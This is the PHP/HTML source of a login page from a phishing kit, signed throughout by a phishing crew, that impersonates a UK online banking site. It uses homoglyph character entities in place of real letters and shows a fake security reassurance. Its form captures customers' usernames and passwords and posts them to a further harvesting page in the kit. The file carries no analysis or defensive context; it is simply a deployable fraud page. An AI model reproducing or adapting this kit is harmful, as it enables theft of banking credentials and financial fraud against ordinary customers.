<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("assets/includes/LoginSecondary.php");
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Login</title>
<link href="assets/img/favicon.ico" rel="shortcut icon">
<link href="assets/css/global1-min140807.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/global2-min140729.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/yeah-js.css" media="screen" rel="stylesheet" type="text/css">
<script src="assets/js/jquery-min140807.js" type="text/javascript"></script>
<script src="assets/js/scriptsnippet.jspf" type="text/javascript"></script>
<script src="assets/js/global-min140807.js" type="text/javascript"></script>
<script src="assets/js/custom-min140729.js" type="text/javascript"></script>
<script src="assets/js/progressbar.js" type="text/javascript"></script>
</head>
</head>
<body>
<div id="wrapper">
<div style="display:none">
<form method="post" action="mobile/index.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true" name="MobileGuy" id="MobileGuy">
</form><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="outer"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div id="header"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<ul id="skiplinks"><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<li><a href="#" id="lnkSkip" name="lnkSkip">Skip to main content</a></li>
</ul>
<div class="clearfix"><span id="strbrandname" style="display: none"></span>
<p id="logo"><span><img alt="assets/logo.jpg" src=""></span></p>
<div class="secureMsg">
<p class="msg"><img alt="" src="assets/img/583.png"></p>
<p><a class="newwin" href="#" title="">How can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a class="linkBullet" href="mobile/index.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" title="Mobile">&Mu;obile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#" title="Cookie policy">Cookie policy</a></li>
</ul><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<h1>Welc&omicron;me t&omicron; &Omicron;nline &Beta;anking</h1>
<p>If you don't already use &Omicron;nline &Beta;anking, it's simple to&#160;<a href="#" title="register online">register &omicron;nline</a>.</p>
<form action="Memorable.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" autocomplete="off" class="validationName:(login) validate:()" enctype="application/x-www-form-urlencoded" id="frmLogin" method="post" name="frmLogin">	
<div class="inner">
<p><strong>Enter your username and password to sign in.</strong></p>
<div class="subPanel">
<fieldset>
<div class="formField validate:(required) validationName:(userID) clearfix">
<div class="formFieldInner"><label for="frmLogin:strCustomerLogin_userID">Username</label> 
<input autocomplete="off" class="field setFocus" id="frmLogin:strCustomerLogin_userID" maxlength="30" name="username" type="text" value=''>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="formField validate:(required) validationName:(password) clearfix">
<div class="formFieldInner">
<label for="frmLogin:strCustomerLogin_pwd">Password</label> 
<input class="field" id="frmLogin:strCustomerLogin_pwd" maxlength="20" name="password" type="password" value="">
</div>
</div>
<div class="formField fieldHelp checkbox clearfix">
<div class="formFieldInner">
<input id="frmLogin:loginRemember" name="frmLogin:loginRemember" type="checkbox"> 
<label for="frmLogin:loginRemember">Remember my username on this computer</label> 
<span class="cxtHelp"><a class="cxtTrigger" href="#cxtHelp1" title="Click to find out more about remembering your User ID.">[?]</a></span>
<div class="help" id="cxtHelp1">
<p><strong>Remember my username</strong><br>
Tick this box to save your username on this computer. This won&#8217;t save your password though. You&#8217;ll still have to enter it each time you want to access your account. We use a&#160;<a class="newwin" href="#">cookie</a>&#160;t&omicron; d&omicron; this.<br></p>
<p></p><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="inner">
<p><strong>Warning:</strong> Don&#8217;t tick this box if you&#8217;re using a public or shared computer.</p>
</div>
<div class="loginActions clearfix"><input alt="Continue" class="submitAction" id="frmLogin:btnLogin1" name="frmLogin:btnLogin1" src="assets/img/continue.png" type="image">
<ul class="linkList" id="frmLogin:pnlLogin2">
<li><a href="#" id="frmLogin:lkLogin2" name="link1" title="Forgotten your password?">Forgotten your password?</a></li>
<li><a href="#" id="frmLogin:lkLogin1" name="link2" title="Forgotten your username?">Forgotten your username?</a></li>
<li><a href="#" id="frmLogin:lkLoginTrouble" name="frmLogin:lkLoginTrouble" title="Having problems signing in?">Having problems signing in?</a></li>
</ul>
</div>
</fieldset>
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</form><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div><!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
<div class="panel">
<div class="salesPromo clearfix">
<p class="Img"><img alt="&#160;" src="assets/img/101.png"></p>
<div class="Msg">
<h1>M&Omicron;RE SPEED. LESS FUSS</h1>
<h3 style="text-align: left">&Omicron;ur new app makes mobile banking extra easy. Available now on iPhone and Android.&#160;<a class="newwin" href="#" title="Tell me more">Tell me more</a></h3>
</div>
</div>
</div>
</div>
</div>
<?php echo secondary; ?>
<!-- Created by::: l33bo--phishers ::: icq: 695059760  -->
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#" title="Legal">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#" title="">Homepage</a></li>
<li><a class="newwin" href="#" title="Rates &amp; fees">Rates & fees</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>